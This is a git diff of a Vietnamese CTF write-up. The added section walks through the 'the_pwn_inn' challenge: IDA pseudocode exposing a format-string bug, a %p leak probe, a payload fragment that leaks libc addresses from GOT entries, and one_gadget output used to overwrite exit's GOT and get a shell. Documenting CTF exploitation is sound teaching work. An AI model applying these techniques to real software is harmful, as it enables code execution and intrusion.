@@ -212,9 +212,9 @@ Gadgets information
               ..................
 Unique gadgets found: 106
 ```
+Mình đã lọc bớt để có wu hiển thị gadget trên wu này. Quan sát gadget ta thấy ta có thể điều khiển được thanh ghi $rax (giá trị =0 và = 1), $rdi, $rsi và cả $rbp và $rsp nữa :)) và 1 gadget quan trọng đó là syscall.
 > ## Ý tưởng khai thác:
 > ### payload đầu tiên:
-Mình đã lọc bớt để có wu hiển thị gadget trên wu này. Quan sát gadget ta thấy ta có thể điều khiển được thanh ghi $rax (giá trị =0 và = 1), $rdi, $rsi và cả $rbp và $rsp nữa :)) và 1 gadget quan trọng đó là syscall.
 Ý tưởng khai thác:
 - Đầu tiên mình sẽ đè bằng 1 địa chỉ mà mình xác định được có quyền write (mình chọn ở phân vùng .bss). Bởi vì khi lệnh leave (của hàm main) thực thi thì $rbp = address_bss mà mình đã ghì đè. 
 - Tiếp theo tận dụng giá trị $rax bằng 0 sẵn có mình gọi syscall read, với giá trị của ```$rsi = address_bss```. Vậy tại sao mình lạ read ở address_bss? Bởi bị khi mình sử dụng gadget ```mov eax, 0 ; leave ; ret``` để set $eax = 0 để có thể gọi read lại thì lúc này đến lệnh leave (mình sẽ gọi là lệnh leave thứ 2) ```$rsp sẽ nằm tại``` địa chỉ của ```$rbp hiện tại tức address_bss```.
@@ -267,8 +267,94 @@ Get flag:
 
 File solve: [exploit.py](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/external.py)
 
+> #Challenge: the_pwn_inn
+## File challenge: [the_pwn_inn](https://github.com/19520611/Writeup/blob/main/0x41414141/src/the_pwn_inn/the_pwn_inn?raw=true)
+Phân tích file:
 
+file:
+```
+$ file the_pwn_inn
+the_pwn_inn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=14fc1c701ef6aaae7b503071e34cc157ca6a2fad, for GNU/Linux 3.2.0, not stripped
+```
+checksec:
+```
+$ checksec the_pwn_inn
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```   
+Xem mã giả bằng IDA pro:
+```
+// local variable allocation has failed, the output may be wrong!
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  ignore_me_init_buffering(*(_QWORD *)&argc, argv, envp);
+  ignore_me_init_signal();
+  puts("Welcome to the pwn inn! We hope that you enjoy your stay. What's your name? ");
+  vuln();
+}
+```
+Hàm này không có gì bất thường, ta đi vào hàm vuln() được gọi trong hàm main:
+```
+void __noreturn vuln()
+{
+  char s; // [rsp+0h] [rbp-110h]
+  unsigned __int64 v1; // [rsp+108h] [rbp-8h]
 
+  v1 = __readfsqword(0x28u);
+  fgets(&s, 256, stdin);
+  printf("Welcome ", 256LL);
+  printf(&s);
+  exit(1);
+}
+```
+Ta có thể thấy 1 rõ ràng lỗi format string ở đây. Phía dưới là hàm exit(), nên khi chạy vào hàm vuln chương trình sẽ exit ngay. Vậy thì ta chỉ cần ghì đè got của exit() bằng addr của hàm main hay vunl thì ta đã giải quyết được việc exit ngay của chương trình.
+> ## Ý tưởng khai thác
+> ### leak libc:
+Nhập vào chuỗi quen thuộc: 
+```
+$ ./the_pwn_inn
+Welcome to the pwn inn! We hope that you enjoy your stay. What's your name?
+AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
+Welcome AAAAAAAA.0x7ffd5276ee30.(nil).(nil).0x7ffd527714b0.0x8.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025
+```
+Ta thấy được offset mà format sting trỏ vào chuỗi ta nhập vào là 6. Truyền got của 2 hàm mà ta muốn trỏ tới sau đó dùng %s ta sẽ leak được địa chỉ của 2 hàm libc đó.
+```
+payload = " -%8$s- "
+payload += " -%9$s- 
+payload += p64(got_puts)
+payload += p64(got_fgets)
+```
+Mình hay tra libc ở https://libc.blukat.me/. Sau đó tải libc này về.
+> ### Lên shell:
+Sử dụng công cụ one_gadget tìm gadget thích hợp:
+```
+$ one_gadget libc6_2.31-0ubuntu9.2_amd64.so
+0xe6e73 execve("/bin/sh", r10, r12)
+constraints:
+  [r10] == NULL || r10 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6e76 execve("/bin/sh", r10, rdx)
+constraints:
+  [r10] == NULL || r10 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6e79 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+```
+Mình sử dụng gadget 0xe6e76. Sau đó ta cộng gadget này với libc base, mình ghì đè got exit bằng địa chỉ vừa cộng này -> lên shell.
+
+Get flag:
+
+![screenshot](https://github.com/19520611/Writeup/blob/main/0x41414141/img/thepwn.PNG)
+
+### File solve: [exploit](https://github.com/19520611/Writeup/blob/main/0x41414141/src/the_pwn_inn/ethe.py)
+# Cảm ơn các bạn đã đọc. Do kiến thức còn hạn hẹp có sai sót mình sẽ khắc phục ngay
 
 
 
